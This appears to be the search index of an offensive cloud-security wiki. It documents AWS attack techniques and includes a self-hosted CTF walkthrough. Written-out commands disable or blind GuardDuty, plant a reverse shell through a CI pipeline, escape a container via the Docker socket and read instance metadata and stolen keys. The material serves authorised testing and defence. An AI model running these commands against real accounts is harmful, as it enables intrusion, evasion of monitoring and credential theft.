{"config":{"lang":["en"],"separator":"[\\s\\-]+"},"docs":[{"title":"Home","text":"<p>Hacking the cloud is an encyclopedia of the attacks/tactics/techniques that offensive security professionals can use on their next cloud exploitation adventure. The goal is to share this knowledge with the security community to better defend cloud native technologies.</p> <p>All content on this site is created by volunteers. If you'd like to be one of them, you can contribute your knowledge by submitting a Pull Request. We are open to content from any major cloud provider and will also accept cloud-related technologies as well (Docker, Terraform, K8s, etc.). Additionally you are encouraged to update/modify/improve existing pages as well.</p> <p>Topics can include offensive techniques, tools, general knowledge related to cloud security, etc. Defensive knowledge is also welcome! At the end of the day the primary goal is to make the cloud safer, and defenders are welcome to submit content all the same.</p> <p>Don't worry about submitting content in the wrong format or what section it should be a part of, we can always make improvements later :) When writing content about a technique identified by a researcher, credit the researcher who discovered it and link to their site/talk.</p>","location":""},{"title":"Contributing","text":"<p>If you'd like to contribute to the site, please see our contributing page. Anything helps! An article, a paragraph, or even a fix for a grammar mistake.</p> <p>Please checkout the GitHub page for more!</p>","location":"#contributing"},{"title":"Disclaimer","text":"<p>The information provided by Hacking the Cloud is intended to be used by professionals who are authorized to perform security assessments or by those defending cloud environments. While these techniques can be used to avoid detection, escalate privileges, compromise resources, etc. the intent is to improve security by making the knowledge of these techniques more generally available.</p>","location":"#disclaimer"},{"title":"Bypass GuardDuty Pentest Findings","text":"<p>When making AWS API requests on common penetration testing OS's GuardDuty will detect this and trigger a PenTest Finding.</p> <p>This is caused by the user agent name that is passed in the API request. By modifying that we can prevent GuardDuty from detecting that we are operating from a \"pentest\" Linux distribution.</p>  <p>Warning</p> <p>If your assessment requires you to remain undetected it's probably easier to leverage a \"safe\" OS like Ubuntu, Mac OS, or Windows.</p>  <p>To do this, identify the location of your <code>session.py</code> in the <code>botocore</code> package. For example, on a default Kali Linux install it can be found at <code>/usr/local/lib/python3.7/dist-packages/botocore/session.py</code>.</p> <p>On line 456 (at the time of writing), you should see the following.</p>  <p></p>  <p><code>platform.system()</code> and <code>platform.release()</code> are similar to <code>uname -o</code> and <code>uname -r</code>. On a stock Kali install it will generate the following values.</p>  <p></p>  <p>To get around this, modify the code and replace it with legitimate user agent strings like those found in Pacu. With this capability you can mask your user agent to look like anything you want. Even arbitrary values like below.</p>  <p></p>","location":"aws/avoiding-detection/guardduty-pentest/"},{"title":"Bypass GuardDuty Tor Client Findings","text":"<p>UnauthorizedAccess:EC2/TorClient is a high severity GuardDuty finding that fires when an EC2 instance is detected making connections to Tor Guard or Authority nodes. According to the documentation, \"this finding may indicate unauthorized access to your AWS resources with the intent of hiding the attacker's true identity\".</p> <p>AWS determines this by comparing connections to the public list of Tor nodes. To those familiar with the Tor project, this is a common problem. Countries, internet service providers, and other authorities may block access to the Tor network making it difficult for citizens to access the open internet.</p> <p>From a technical perspective the Tor Project has largely gotten around this by using Bridges. Bridges are special nodes that do not disclose themselves like other Tor nodes do. Individuals who would normally have difficulty connecting directly to Tor can instead route their traffic through Bridge nodes. Similarly, we can bypass the Tor Client GuardDuty finding by using bridges.</p> <p>To do so, download the Tor and obfs4proxy binaries (the simplest way to do this on a Debian based system is <code>apt install tor obfs4proxy</code> and move them to your target). Obfs4 is a Pluggable Transport which modifies Tor traffic to communicate with a bridge. Navigate to bridges.torproject.org to get a bridge address. </p> <p>From here, create a torrc file with the following contents (being sure to fill in the information you got for the bridge address):</p> <pre><code>UseBridges 1\nBridge obfs4 *ip address*:*port* *fingerprint* cert=*cert string* iat-mode=0\nClientTransportPlugin obfs4 exec /bin/obfs4proxy\n</code></pre> <p>You will now be able to connect to the Tor network with <code>tor -f torrc</code> and you can connect to the Socks5 proxy on port 9050 (by default).</p>","location":"aws/avoiding-detection/guardduty-tor-client/"},{"title":"Modify GuardDuty Configuration","text":"<p>When an account has been successfully compromised, an attacker can modify threat detection services like GuardDuty to reduce the likelihood of their actions triggering an alert. Modifying, as opposed to outright deleting, key attributes of GuardDuty may be less likely to raise alerts, and result in a similar degradation of effectiveness.  The actions available to an attacker will largely depend on the compromised permissions available to the attacker, the GuardDuty architecture and the presence of higher level controls like Service Control Policies. </p> <p>Where GuardDuty uses a delegated admin or invite model, features like detector configurations and IP Trust lists are centrally managed, and so they can only be modified in the GuardDuty administrator account. Where this is not the case, these features can be modified in the account that GuardDuty is running in.</p>","location":"aws/avoiding-detection/modify-guardduty-config/"},{"title":"Misconfiguring the Detector","text":"<p>An attacker could modify an existing GuardDuty detector in the account, to remove log sources or lessen its effectiveness.</p> <p>Configuration changes may include a combination of:</p> <ul> <li>Disabling the detector altogether.  </li> <li>Removing Kubernetes and s3 as data sources, which removes all S3 Protection and Kubernetes alerts.  </li> <li>Increasing the event update frequency to 6 hours, as opposed to as low as 15 minutes.</li> </ul> <p>Required permissions to execute:</p> <ul> <li>guardduty:ListDetectors</li> <li>guardduty:UpdateDetector</li> </ul> <p>Example CLI commands <pre><code># Disabling the detector\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --no-enable \n\n# Removing s3 as a log source\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --data-sources S3Logs={Enable=false}\n\n# Increase finding update time to 6 hours\naws guardduty update-detector \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --finding-publishing-frequency SIX_HOURS\n</code></pre></p>","location":"aws/avoiding-detection/modify-guardduty-config/#misconfiguring-the-detector"},{"title":"Modifying Trusted IP Lists","text":"<p>An attacker could create or update GuardDuty's Trusted IP list, including their own IP on the list.  Any IPs in a trusted IP list will not have any Cloudtrail or VPC flow log alerts raised against them. </p> <p>DNS findings are exempt from the Trusted IP list.</p> <p>Required permissions to execute:</p> <ul> <li>guardduty:ListDetectors</li> <li>guardduty:ListIPSet</li> <li>iam:PutRolePolicy</li> <li>guardduty:CreateIPSet (To create new list)</li> <li>guardduty:UpdateIPSet (To update an existing list)</li> </ul> <p>Depending on the level of stealth required, the file can be uploaded to an s3 bucket in the target account, or an account controlled by the attacker.</p> <p>Example CLI commands <pre><code>aws guardduty update-ip-set \\\n    --detector-id 12abc34d567e8fa901bc2d34eexample \\\n    --ip-set-id 24adjigdk34290840348exampleiplist \\\n    --location https://malicious-bucket.s3-us-east-1.amazonaws.com/customiplist.csv \\\n    --activate\n</code></pre></p>","location":"aws/avoiding-detection/modify-guardduty-config/#modifying-trusted-ip-lists"},{"title":"Modify Cloudwatch events rule","text":"<p>GuardDuty populates its findings to Cloudwatch Events on a 5 minute cadence.  Modifying the Event pattern or Targets for an event may reduce GuardDuty's ability to alert and trigger auto-remediation of findings, especially where the remediation is triggered in a member account as GuardDuty administrator protections do not extend to the Cloudwatch events in the member account. </p>  <p>Note</p> <p>In a delegated or invitational admin GuardDuty architecture, cloudwatch events will still be created in the admin account.</p>  <p>Required permissions to execute:</p> <ul> <li>event:ListRules</li> <li>event:ListTargetsByRule</li> <li>event:PutRule</li> <li>event:RemoveTargets</li> </ul> <p>Example CLI commands <pre><code># Disable GuardDuty Cloudwatch Event\naws events put-rule --name guardduty-event \\\n--event-pattern \"{\\\"source\\\":[\\\"aws.guardduty\\\"]}\" \\\n--state DISABLED\n\n# Modify Event Pattern\naws events put-rule --name guardduty-event \\\n--event-pattern '{\"source\": [\"aws.somethingthatdoesntexist\"]}'\n\n# Remove Event Targets\naws events remove-targets --name guardduty-event \\\n--ids \"GuardDutyTarget\"\n</code></pre></p>","location":"aws/avoiding-detection/modify-guardduty-config/#modify-cloudwatch-events-rule"},{"title":"Supression Rules","text":"<p>Newly create GuardDuty findings can be automatically archived via Suppression Rules. An adversary could use filters to automatically archive findings they are likely to generate. </p> <p>Required permissions to execute:</p> <ul> <li>guardduty:CreateFilter</li> </ul> <p>Example CLI commands</p> <pre><code>aws  guardduty create-filter --action ARCHIVE --detector-id 12abc34d567e8fa901bc2d34e56789f0 --name yourfiltername --finding-criteria file://criteria.json\n</code></pre> <p>Filters can be created using the CreateFilter API.</p>","location":"aws/avoiding-detection/modify-guardduty-config/#supression-rules"},{"title":"Delete Publishing Destination","text":"<p>An adversary could disable alerting simply by deleting the destination of alerts.</p> <p>Required permissions to execute:</p> <ul> <li>guardduty:DeletePublishingDestination</li> </ul> <p>Example CLI commands</p> <pre><code>aws guardduty delete-publishing-destination --detector-id abc123 --destination-id def456\n</code></pre>","location":"aws/avoiding-detection/modify-guardduty-config/#delete-publishing-destination"},{"title":"Bypass Credential Exfiltration Detection","text":"<p>Link to Tool: SneakyEndpoints</p> <p>A common technique when exploiting AWS environments is leveraging SSRF, XXE, command injection, etc. to steal IAM credentials from the instance metadata service of a target EC2 instance. This can allow you to execute AWS API calls within the victim's account, however, it comes with a risk. If you were to try to use those credentials outside of that host (for example, from your laptop) an alert would be triggered. There is a GuardDuty finding which detects when IAM credentials are being used outside of EC2 called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.OutsideAWS.</p> <p>To get around this alert being triggered, attackers could use the stolen credentials from the attacker's EC2 instance. The alert only detected if the credentials were used outside of EC2, not the victim's specific EC2 instance. So by using their own, or exploiting another EC2 instance, attackers could bypass the GuardDuty alert.</p> <p>On January 20th 2022, AWS released a new GuardDuty finding called UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration.InsideAWS. This new finding addressed the shortcomings of the previous one. Now, when IAM credentials are used from ANY EC2, if those credentials don't belong to the same account as the EC2 instance using them, it triggers the alert. Thus, simply using your own EC2 instance is no longer viable. This addresses a long standing concern within the cloud security community.</p> <p>However, there is currently a functioning bypass for this - VPC Endpoints. Using VPC Endpoints will not trigger the GuardDuty alert. What this means is that, as an attacker, <code>if you steal IAM credentials from an EC2 instance, you can use those credentials from your own EC2 instance while routing traffic through VPC Endpoints. This will not trigger the GuardDuty finding</code>.</p> <p>To make this setup faster (and easier) for Penetration Testers and Red Teamers, SneakyEndpoints was created. This project has all the Terraform configurations necessary to spin up an environment to attack from. It will create an EC2 instance in a private subnet (no internet access) and create a number of VPC Endpoints for you to use. This setup ensures we don't accidentally expose ourselves and trigger the alert.</p>  <p>Note</p> <p>There is another bypass option, however, it would only be useful in niche scenarios. The InstanceCredentialExfiltration finding is only tied to the AWS account, not the EC2 instance. As a result, if you compromise an EC2 instance in the target account and then compromise OTHER EC2 instances in the account, or steal their IAM credentials, you can safely use them from the initially compromised instance without fear of triggering GuardDuty.</p>","location":"aws/avoiding-detection/steal-keys-undetected/"},{"title":"CI/CDon't","text":"<p>Link to Project: CI/CDon't</p>  <p>Note</p> <p>This project will deploy intentionally vulnerable software/infrastructure to your AWS account. Please ensure there is no sensitive or irrecoverable data in the account. Attempts have been made to mitigate this however they may not be fullproof; Security Group rules only allow access to the vulnerable EC2 instance from your public IP address, and a randomly generated password is required to access it.</p>   <p>Warning</p> <p>If you intend to play the CTF it is a good idea to read through this page carefully to ensure you have all the details (minus the walkthrough). This page will familiarize the player with how the CTF works, what the objective is, and what the storyline is.</p>","location":"aws/capture_the_flag/cicdont/"},{"title":"Background","text":"<p>This is an AWS/GitLab CI/CD themed CTF that you can run in your own AWS account. All that is required is an AWS account and Terraform installed locally on your machine.</p> <p>Costs should be minimal; running this infrastructure in my own account for three hours didn't accrue a cent in the Billing Dashboard, however extended time frames may cause costs to add up.</p> <p>In terms of difficulty, it would be rated low. The goal is more about having fun and working through some simple CI/CD/AWS challenges that even non-security folks would enjoy.</p>","location":"aws/capture_the_flag/cicdont/#background"},{"title":"How to Play","text":"<p>Clone this repository and navigate to the cicdont directory.</p> <pre><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git\ncd htc-ctfs/aws/cicdont\n</code></pre> <p>To deploy the CTF environment run the Terraform init/apply command.</p> <pre><code>terraform init\nterraform apply\n</code></pre> <p>You will be prompted with two questions. The first is a consent related to the costs of the CTF (Again, these should be minimal however the environment should still be taken down when you're finished with it). The second is asking your player name. Please do not use special characters in the name, only upper and lower case letters. This will be used in the game.</p>  <p>Note</p> <p>It will take approximately 10 minutes for all the infrastructure to be deployed and ready. This 10 minute timer begins AFTER the Terraform apply has completed. This time is used to install all the software, create the NPCs, etc.</p>   <p>Warning</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create a security group that only that IP address can access. If you cannot access the target_ip (explained below) after 10 minutes, check the AWS console for a security group named <code>allow_http</code> and ensure that its configuration would allow you to reach it.</p>  <p>To destroy the CTF environment run the Terraform destroy command.</p> <pre><code>terraform destroy\n</code></pre> <p>This will again prompt you for the two questions. Please answer them and the infrastructure will be destroyed.</p>","location":"aws/capture_the_flag/cicdont/#how-to-play"},{"title":"The Important Bits","text":"<p>Once you've run terraform apply, you will receive 5 outputs. This will include the following:</p> <ul> <li>Player Username</li> <li>Player Password (randomly generated)</li> <li>Attackbox IP</li> <li>Target IP</li> <li>Time warning</li> </ul> <p>The attackbox is an EC2 instance you can use for whatever purposes you deem fit. In particular you can use it to catch a reverse shell, or load your C2 platform of choice on it (you have sudo access via the password).</p> <p>To access the attackbox, you can ssh using your player username and password.</p> <pre><code>ssh &lt;player username&gt;@&lt;attackbox IP&gt;\n</code></pre>  <p>Note</p> <p>When sshing with a player username, note that the username is case-sensitive.</p>  <p>It will take approximately 10 minutes for all the infrastructure to finish deploying. If you'd like to test if it's finished, you can navigate to <code>http://&lt;target IP&gt;/</code>. If it doesn't respond, or only shows a generic GitLab login page, then the CTF is not ready yet. If you see a message about SoftHouseIO, then everything is setup and ready.</p>  <p>Note</p> <p>To be able to access the vulnerable instance, Terraform will attempt to determine your public IP address and create security group rules that only that IP address can access. If you cannot access the target instance after 10 minutes (likely shorter), check the AWS console for a security group named <code>allow_http</code> and ensure that it's configuration would allow you to reach it.</p> <p>These security group rules apply to both the target (GitLab) and the attackbox. Additionally, the rules are configured to allow the attackbox to receive incoming traffic from the target (to catch shells).</p>  <p>If you see any references to <code>gamemaster</code>, please ignore it. Those scripts are used to simulate the NPCs and have them complete their lore tasks. It is unrelated to the challenge.</p>","location":"aws/capture_the_flag/cicdont/#the-important-bits"},{"title":"The Story","text":"<p>You are &lt;player username&gt;, a developer at SoftHouseIO, an independent software development consultancy firm. While you like the company, you're thinking about making a little money on the side, perhaps through not entirely legal means. Can you say ransomware?</p> <p>After planning your attack you figure the best place to get started is the company GitLab server at http://&lt;target IP&gt;. Your username and password should you get you in. You'll want to gain access to administrative credentials for the AWS account the company uses.</p>","location":"aws/capture_the_flag/cicdont/#the-story"},{"title":"The Objective","text":"<p>Gain access to the <code>aws_admin_automation_user</code> through whatever means necessary (Note that this role has no permissions. It is simply the goal).</p>","location":"aws/capture_the_flag/cicdont/#the-objective"},{"title":"Feedback","text":"<p>Want to provide feedback on the challenge? Open a new discussion on GitHub</p>","location":"aws/capture_the_flag/cicdont/#feedback"},{"title":"Walkthrough","text":"<p>The following is a step by step walkthrough of the CTF. You can refer to this if you get stuck or simply just want to know what is next. Click the summary below to expand it.</p>  Summary <p>Consent and Name</p> <p>To begin the CTF we must first stand up all the infrastructure. We do this using Terraform.</p> <p>Download the challenge using git. <pre><code>git clone https://github.com/Hacking-the-Cloud/htc-ctfs.git\ncd htc-ctfs/aws/cicdont\n</code></pre></p> <p>Initialize the project. <pre><code>terraform init\n</code></pre></p> <p>Create the infrastructure. <pre><code>terraform apply\n</code></pre></p> <p>We will be prompted first with a consent. Read through the question and answer with yes or no.</p> <p>After this, it will ask for a player name. Please only use lower and uppercase letters. No special characters or numbers.</p> <p></p> <p>After this, you will be asked if you'd like to perform the deployment. Answer with \"yes\".</p> <p>The Terraform deployment will begin.</p> <p>Wait</p>  <p>Note</p> <p>You will now need to wait 10 minutes for the deployment to finish. The 10 minute timer starts AFTER you get the \"Apply complete\" notification.</p>  <p></p> <p>Does it really take 10 minutes? Yes, it takes a little bit to get everything setup. You can take this time to get familiar with your attackbox. This is an EC2 instance you can use for whatever you need during the CTF, particularly to catch shells.</p> <p>You can ssh into the box using your username and password</p> <pre><code>ssh &lt;player_username&gt;@&lt;target_ip&gt;\n</code></pre>  <p>Note</p> <p>The username is case-sensitive.</p>  <p>Getting Started</p> <p>After waiting those 10 minutes, you finally have a target. You can navigate to the target_ip to see a GitLab instance. Log in using your player username and password.</p> <p></p> <p>From here, you can navigate around, explore the various projects, and more. You might even notice a little notification in the upper right hand corner.</p> <p></p> <p>Ashley has some work for us! Perhaps this will give us a hint for something we can exploit.</p> <p>Navigate to the mvp-docker project's Issues page.</p> <p></p> <p>This is interesting for a few reasons. Most notably, Ashley wants some help with building a Docker container as a part of the CI/CD pipeline. She also mentions a gitlab-ci.yml file, which is the configuration for the GitLab CI/CD pipeline.</p> <p>Building Docker images as a part of a CI/CD pipeline can have serious security implications and this is definitely worth looking into.</p> <p>Before we can get to that fun, let's take a look at that gitlab-ci.yml file. Navigate there and make some changes (you can edit the file through the web browser if you prefer or you can clone the project locally).</p> <p></p> <p>After committing changes (via the web interface or otherwise) you can navigate to the <code>CI/CD</code> tab on the left to see the pipeline execute.</p> <p>Clicking on the status, and then the build job we can see the output.</p> <p></p> <p>This can tell us a few things that are very useful to us as attackers. First, on line 3, we see that the CI/CD pipeline is using the \"docker\" executor, meaning everything executes inside a Docker container somewhere. On line 6, we see that it is using an Ubuntu Docker image. And lines 20+ show us that our input is executing in this environment.</p> <p>This looks like a fantastic place to start.</p> <p>Getting a Reverse Shell</p> <p>Our next step will be to get a shell in this environment. This is where our attackbox can come in.</p> <p>Please note: You are welcome to use your C2 platform of choice (If you'd like a recommendation, I'm a fan of Mythic). For this walkthrough I will use netcat for simplicity.</p> <p>SSH into your attack box and install a tool called <code>ncat</code>.</p> <p></p> <p>Now, we can setup a listener (from the attackbox) with the following command.</p> <pre><code>sudo ncat -l 443 --ssl -v\n</code></pre> <p>We can now go back and edit the gitlab-ci.yml file to send a reverse shell. Using Ncat it's as easy as adding the following lines. From our previous foray we know this is an Ubuntu Docker container, and thus, we can use the apt package manager.</p> <pre><code>apt update\napt install -y ncat\nncat &lt;attackbox_ip&gt; 443 --ssl -e /bin/bash -v\n</code></pre> <p></p> <p>Now click \"Commit changes\" and watch that pipeline run.</p> <p>You are now the proud owner of a reverse shell inside this Docker container.</p> <p></p> <p>Docker Socket</p> <p>From here, there are a number of things we could try to do. Your first instinct may be, \"I'm on an EC2 instance, can I reach the metadata service?\". That's a great idea! Unfortunately you can't.</p> <p>The bright folks over at SoftHouseIO use IMDSv2, one of the benefits of which is that Docker containers cannot reach it by default.</p> <pre><code>TTL of 1: The default configuration of IMDSv2 is to set the Time To Live (TTL) of the TCP packet containing the session token to \"1\". This ensures that misconfigured network appliances (firewalls, NAT devices, routers, etc.) will not forward the packet on. This also means that Docker containers using the default networking configuration (bridge mode) will not be able to reach the instance metadata service.\n</code></pre> <p>That's a bummer. Other options? Try and pivot off this machine to something else in the VPC? Access a service exposed internally to the host (172.17.0.1)? Escape the container?</p> <p>That last one might get us somewhere. Ashley mentioned having some issues about building a Docker container in the pipeline. To do that, wouldn't they have to use something like kaniko? What if they just exposed the Docker socket instead?</p> <p>When a Docker socket is exposed inside a container, it can have dangerous consequences as an attacker can potentially escape the container and escalate privileges on the host.</p> <p>The common location for the socket is at <code>/var/run/docker.sock</code>, let's go look for it.</p> <p></p> <p>There we go! They did mount the Docker socket! Let's use this to escape the container.</p> <p>Escaping the Container</p> <p>Note: There are many different ways you could abuse this to escape the container. I will walk through what I think is the simplest.</p> <p>First let's install two tools that will make things easier for ourselves.</p> <pre><code>apt update\napt install -y python3 docker.io\n</code></pre> <p>Python3 will help us to spawn a <code>tty</code> and having the Docker binary will make it easier to interact with the Docker socket. We could alternatively use curl.</p> <p>With those two tools installed, let's spawn a <code>tty</code> with the classic Python one-liner.</p> <pre><code>python3 -c \"import pty;pty.spawn('/bin/bash')\"\n</code></pre> <p></p> <p>Doesn't that looks so much better? We have an actual shell prompt now. This will be useful for interacting with the Docker socket. Speaking of which, let's see which Docker containers are running on the host.</p> <pre><code>docker ps\n</code></pre> <p>This output lets us know that everything is working as intended. With access to the Docker socket, let's escape by creating a privileged Docker container (Note: There are a number of options to do this).</p> <pre><code>docker run -it --rm --pid=host --privileged ubuntu bash\n</code></pre> <p>Now, inside our new privileged container, let's migrate to the namespace of a process running on the host.</p> <pre><code>nsenter --target 1 --mount --uts --ipc --net --pid -- bash\n</code></pre> <p></p> <p>How fun is that?! We now have root on the underlying host and have escaped the container.</p> <p>Escalating</p> <p>With root on the host, we have a number of options for next steps. We can steal IAM credentials from the metadata service, brute force our IAM permissions, enumerate roles in the account to find out what services are running in the account, attempt to escalate IAM privileges, maybe try to intercept the SSM agent if it's running on the box? One place we should check before doing all that is the user data.</p> <p>User data is used to run commands when an EC2 instance is first started or after it is rebooted (with the right configuration). This can be very helpful to determine what software is installed on the machine, and it can also potentially be a source of credentials from developers who aren't very careful.</p> <p>Let's check this (remember we are using IMDSv2).</p> <pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" -v http://169.254.169.254/latest/user-data/\n</code></pre> <p></p> <p>On first glance it appears pretty standard; It installs GitLab, installs the GitLab runners, activates them, etc.</p> <p>There is a slight problem though, on the line where they installed GitLab, they accidentally leaked a credential. An important one at that. That is the credential to the root user of GitLab.</p> <p>This is bad news for SoftHouseIO and great news for us. Let's use this to log into the GitLab web UI as an administrator (username: root, password: &lt;what's in the useradata&gt;)</p> <p>After exploring around for a little while, you may stumble into the the <code>infra-deployer</code> project. That sounds important.</p> <p></p> <p>\"Admin IAM Credentials are being stored in environment variables to be used with the GitLab runners\". That sounds.....very interesting. The good news is that as an administrator, we can see those variables. Navigate to the <code>Settings</code> tab on the left and then click <code>CI/CD</code>. Next, click <code>Expand</code> on the <code>Variables</code> section.</p> <p></p> <p>An Access Key and a Secret Access Key! Let's see who they belong to (you can also do this without logging to CloudTrail if you were so inclined).</p> <pre><code>export AWS_ACCESS_KEY_ID=AKIA....\nexport AWS_SECRET_ACCESS_KEY=....\naws sts get-caller-identity\n</code></pre> <p></p> <p>And with that we have achieved our objective! Congratulations on completing the CTF. Want to provide some feedback? Feel free to open a discussion on GitHub.</p>","location":"aws/capture_the_flag/cicdont/#walkthrough"},{"title":"Acknowledgements","text":"<p>These wonderful folks helped beta-test this CTF and provided feedback.</p> <p>Christophe Tafani-Dereeper Jake Berkowsky Kaushik Pal</p>","location":"aws/capture_the_flag/cicdont/#acknowledgements"},{"title":"Enumerate Permissions without Logging to CloudTrail","text":"<p>Original Research: Nick Frichette Link to Tool: aws_stealth_perm_enum</p>  <p>Warning</p> <p>As of 5/18/2021, this technique has been resolved and fixed by AWS. Mutating the Content-Type header when making API requests no longer can be used to enumerate permissions of a role or user. This page is maintained for historical and inspiration purposes.</p>  <p>After compromising an IAM credential while attacking AWS, your next task will be to determine what permissions that credential has scoped to them.</p> <p>Aside from guessing, enumerating these permissions would typically require a tool to brute force them like enumerate-iam (which is a fantastic tool). The problem of course is that this will generate a ton of CloudTrail logs and will alert any defender. This poses a challenge to us, how can we enumerate permissions in a stealthy manner?  </p> <p>The good news is that there is a bug in the AWS API that affects 589 actions across 39 different AWS services. This bug is a result of a mishandling of the Content-Type header, and when that header is malformed in a specific way the results are not logged to CloudTrail. Based on the response codes/body we can determine if the role does or does not have permission to make that API call.</p> <p>The following services are affected, although please note, that not all actions for these services can be enumerated.  </p>          application-autoscaling appstream   athena autoscaling-plans   aws-marketplace cloudhsm   codecommit codepipeline   codestar comprehend   cur datapipeline   dax discovery   forecast gamelift   health identitystore   kinesis kinesisanalytics   macie mediastore   mgh mturk-requester   opsworks-cm personalize   redshift-data route53domains   route53resolver sagemaker   secretsmanager shield   sms snowball   support tagging   textract translate   workmail      <p>Note</p> <p>For an in depth explanation for the bug, please see the original research. In this article we will just discuss how to take advantage of it.</p>  <p>There are some conditions to the enumeration, and they are defined below.</p> <p>1 - The AWS service uses the JSON 1.1 protocol. 2 - The API actions returns a unique error code depending on the permission set. 3 - The resource associated with that action is set to \"*\".</p> <p>To perform the enumeration there is a script here. Setting the credentials as environment variables and then running the script will inform you what API permissions you have available to you.</p>  <p></p>","location":"aws/deprecated/stealth_perm_enum/"},{"title":"Whoami - Get Principal Name From Keys","text":"<p>Original Research: Spencer Gietzen</p>  <p>Warning</p> <p>As of August 15, 2020 these calls are now tracked in CloudTrail (tweet). This page is maintained for historical and inspiration purposes.</p>","location":"aws/deprecated/whoami/"},{"title":"sdb list-domains","text":"<p>As found by Spencer Gietzen, the API call for sdb list-domains will return very similar information to get-caller-identity.</p> <pre><code>user@host:$ aws sdb list-domains --region us-east-1\n\nAn error occurred (AuthorizationFailure) when calling the ListDomains operation: User (arn:aws:sts::123456789012:assumed-role/example_role/i-00000000000000000) does not have permission to perform (sdb:ListDomains) on resource (arn:aws:sdb:us-east-1:123456789012:domain/). Contact account owner.\n</code></pre>","location":"aws/deprecated/whoami/#sdb-list-domains"},{"title":"Enumerate AWS Account ID from an EC2 Instance","text":"<p>With shell or command line access to an EC2 instance, you will be able to determine some key information about the AWS account.</p>","location":"aws/enumeration/account_id_from_ec2/"},{"title":"get-caller-identity","text":"<p>By using get-caller-identity, the EC2 instance may have an EC2 instance profile setup.</p> <pre><code>user@host:$ aws sts get-caller-identity\n{\n   \"Account\": \"000000000000\",\n   \"UserId\": \"AROAJIWIJQ5KCHMJX4EWI:i-00000000000000000\",\n   \"Arn\": \"arn:aws:sts::000000000000:assumed-role/AmazonLightsailInstanceRole/i-00000000000000000\"\n}\n</code></pre>","location":"aws/enumeration/account_id_from_ec2/#get-caller-identity"},{"title":"Metadata","text":"<p>By using the metadata service, you will be able to retrieve additional information about the account, and more specifically for the EC2 instance being used.</p> <p><pre><code>TOKEN=`curl -X PUT \"http://169.254.169.254/latest/api/token\" -H \"X-aws-ec2-metadata-token-ttl-seconds: 21600\"`\ncurl -H \"X-aws-ec2-metadata-token: $TOKEN\" http://169.254.169.254/latest/dynamic/instance-identity/document\n</code></pre> The output will reveal additional information. <pre><code>{\n   \"accountId\" : \"000000000000\",\n   \"architecture\" : \"x86_64\",\n   \"availabilityZone\" : \"ap-southeast-2a\",\n   \"billingProducts\" : null,\n   \"devpayProductCodes\" : null,\n   \"marketplaceProductCodes\" : null,\n   \"imageId\" : \"ami-042c4533fa25c105a\",\n   \"instanceId\" : \"i-00000000000000000\",\n   \"instanceType\" : \"t2.nano\",\n   \"kernelId\" : null,\n   \"pendingTime\" : \"2022-02-27T22:34:30Z\",\n   \"privateIp\" : \"172.26.6.225\",\n   \"ramdiskId\" : null,\n   \"region\" : \"ap-southeast-2\",\n   \"version\" : \"2017-09-30\"\n}\n</code></pre></p>","location":"aws/enumeration/account_id_from_ec2/#metadata"},{"title":"Enumerate AWS Account ID from a Public S3 Bucket","text":"<ul> <li> <p> Original Research</p>  <p> <p>Finding the Account ID of any public S3 bucket by Ben Bridts</p> <p></p> </p> </li> <li> <p> Tools mentioned in this article</p>  <p>s3-account-search: A tool to find the account ID an S3 bucket belongs to.</p> </li> </ul>   <p>Note</p> <p>The documentation and GitHub repository refer to this tool as <code>s3-account-search</code>, however when it is installed using pip, it is named <code>s3-account-finder</code>. Because of this, all the examples below will use the <code>s3-account-finder</code> name.</p>  <p>By leveraging the s3:ResourceAccount policy condition, we can identify the AWS account ID associated with a public S3 bucket. This is possible because it supports wildcards (*). With this, we can sequentially enumerate the account ID.</p> <p>To test this, you can use Grayhat Warfare's list of public S3 buckets.</p> <p>You will need a role with <code>s3:getObject</code> and <code>s3:ListBucket</code> permissions, and you can specify the target bucket as the resource for your policy. Alternatively you can set a resource of '*' to quickly test multiple buckets.</p>","location":"aws/enumeration/account_id_from_s3_bucket/"},{"title":"Installation","text":"<p>The tool can be installed with the following command:</p> <pre><code>python3 -m pip install s3-account-search\n</code></pre>","location":"aws/enumeration/account_id_from_s3_bucket/#installation"},{"title":"Setup","text":"<p>To use the tool, there is some setup on your end. You will need your own AWS account with a role you can assume with the <code>s3:GetObject</code> or <code>s3:ListBucket</code> permissions. s3-account-finder will assume this role so make sure the credentials you're using can do this.</p>","location":"aws/enumeration/account_id_from_s3_bucket/#setup"},{"title":"Usage","text":"<pre><code>s3-account-finder arn:aws:iam::123456789123:role/s3-searcher &lt;bucket name&gt;\nStarting search (this can take a while)\nfound: 1\nfound: 12\n*** snip ***\nfound: 123456789123\n</code></pre>  <p>Operational Security Tip</p> <p>The majority of this activity would only be logged to the calling account (the account you are running the tool with), however S3 data events and server access logging can be used to see the API activity. That being said, there is no immediate way to counter or prevent you from doing this. Additionally these requests could be spaced out over an extended period of time, further making it difficult to identify.</p>   <p>Tip</p> <p>Pair this with Unauthenticated Enumeration of IAM Users and Roles!</p>","location":"aws/enumeration/account_id_from_s3_bucket/#usage"},{"title":"Brute Force IAM Permissions","text":"<ul> <li> <p> Technique seen in the wild</p>  <p>Reference: Compromised Cloud Compute Credentials: Case Studies From the Wild</p> </li> <li> <p> Tools mentioned in this article</p>  <p>enumerate-iam: Enumerate the permissions associated with an AWS credential set.</p> </li> </ul>  <p>When attacking AWS you may compromise credentials for an IAM user or role. This can be an excellent step to gain access to other resources, however it presents a problem for us; How do we know what permissions we have access to? While we may have context clues based on the name of the role/user or based on where we found them, this is hardly exhaustive or thorough. </p> <p>This leaves us with basically one option, brute force the permissions. To do this, we will try as many safe API calls as possible, seeing which ones fail and which ones succeed. Those that succeed are the permissions we have available to us. There are several tools to do this, however, here we will be covering enumerate-iam by Andr\u00e9s Riancho.</p> <p>To use enumerate-iam, simply pull a copy of the tool from GitHub, provide the credentials, and watch the magic happen. All calls by enumerate-iam are non-destructive, meaning only get and list operations are used. This reduces the risk of accidentally deleting something in a client's account.</p> <pre><code>user@host:/enum$ ./enumerate-iam.py --access-key 